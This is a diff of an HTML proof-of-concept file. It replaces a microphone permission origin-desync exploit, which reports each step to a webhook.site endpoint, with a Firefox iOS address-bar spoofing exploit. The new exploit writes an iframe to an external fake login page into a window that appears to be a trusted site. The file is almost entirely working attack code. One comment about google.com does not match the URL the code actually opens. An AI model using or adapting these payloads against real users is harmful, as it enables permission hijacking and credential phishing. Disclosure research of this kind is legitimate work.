@@ -1,136 +1,47 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>Microphone Origin Desync PoC</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-
+<meta charset="UTF-8">
+<title>Address Bar Spoofing PoC</title>
 <style>
-body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, system-ui;
-  background: #f5f5f7;
-}
-button {
-  font-size: 15px;
-  padding: 10px 14px;
-  border-radius: 10px;
-  border: none;
-  background: #007aff;
-  color: #fff;
-}
-#panel {
-  display: none;
-  max-width: 420px;
-  margin: 80px auto;
-  background: #fff;
-  padding: 24px;
-  border-radius: 16px;
-  box-shadow: 0 20px 60px rgba(0,0,0,.2);
-  text-align: center;
-}
-.notice {
-  margin-top: 14px;
-  font-size: 13px;
-  color: #b00020;
-}
+body { font-family: Arial; text-align:center; margin-top:80px; }
+iframe { width:90%; height:80vh; border:1px solid #ccc; }
+.note { color:red; font-size:13px; margin-bottom:10px; }
 </style>
+
+<script>
+function go() {
+    // Open trusted origin
+   var win = window.open('https://instagram:90');
+
+    if (!win) {
+        alert("Popup blocked");
+        return;
+    }
+
+    setTimeout(function () {
+        try {
+            // Replace document with attacker content (iframe only)
+            win.document.open();
+            win.document.write(`
+                <p class="note">
+                    Demo: Address bar shows google.com, but content below is attacker-controlled.
+                </p>
+
+                <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
+            `);
+            win.document.close();
+
+        } catch (e) {
+            console.log("Blocked:", e);
+        }
+    }, 3000);
+}
+</script>
 </head>
 
 <body>
-
-<div style="text-align:center; margin-top:60px;">
-  <button id="trigger">Start PoC</button>
-</div>
-
-<div id="panel">
-  <h2>Request Microphone</h2>
-  <p>Tap the button below to request microphone permission.</p>
-
-  <button onclick="getMic()">Enable Microphone</button>
-  <p id="output">Microphone: -</p>
-
-  <div class="notice">
-    Demo only — observe origin shown in permission dialog
-  </div>
-</div>
-
-<script>
-const LOG_ENDPOINT = "https://webhook.site/562f0b30-3949-45c2-b3b0-0ac6de5470da";
-
-/* CORS-proof forensic logger */
-function logEvent(type, extra = {}) {
-  const data = {
-    type,
-    ts: performance.now().toFixed(3),
-    epoch: Date.now(),
-    url: location.href,
-    origin: location.origin,
-    visibility: document.visibilityState,
-    readyState: document.readyState,
-    ...extra
-  };
-
-  const params = new URLSearchParams(data).toString();
-  new Image().src = `${LOG_ENDPOINT}?${params}`;
-}
-
-const panel   = document.getElementById('panel');
-const trigger = document.getElementById('trigger');
-const output  = document.getElementById('output');
-
-async function getMic() {
-  if (!navigator.mediaDevices) return;
-
-  logEvent("microphone_requested");
-
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-
-    logEvent("microphone_success", {
-      tracks: stream.getAudioTracks().length
-    });
-
-    output.textContent = "Microphone access granted";
-
-    // stop immediately (no recording)
-    stream.getTracks().forEach(t => t.stop());
-  } catch (err) {
-    logEvent("microphone_error", {
-      name: err.name
-    });
-
-    output.textContent = "Permission denied";
-  }
-}
-
-/* Step 1: URL manipulation */
-trigger.onclick = () => {
-  logEvent("poc_started");
-
-  history.pushState({}, '', '/trusted');
-  logEvent("pushstate_done", { newPath: location.pathname });
-
-  panel.style.display = 'block';
-};
-
-/* Step 2: Navigation race */
-window.addEventListener('pageshow', () => {
-  logEvent("pageshow");
-
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        logEvent("navigation_triggered", {
-          target: "https://google.com:9090"
-        });
-
-        location.href = 'https://google.com:9090';
-      }, 80);
-    });
-  });
-});
-</script>
-
+<h2>Firefox iOS Address Bar Spoofing Test</h2>
+<button onclick="go()">Start Test</button>
 </body>
 </html>
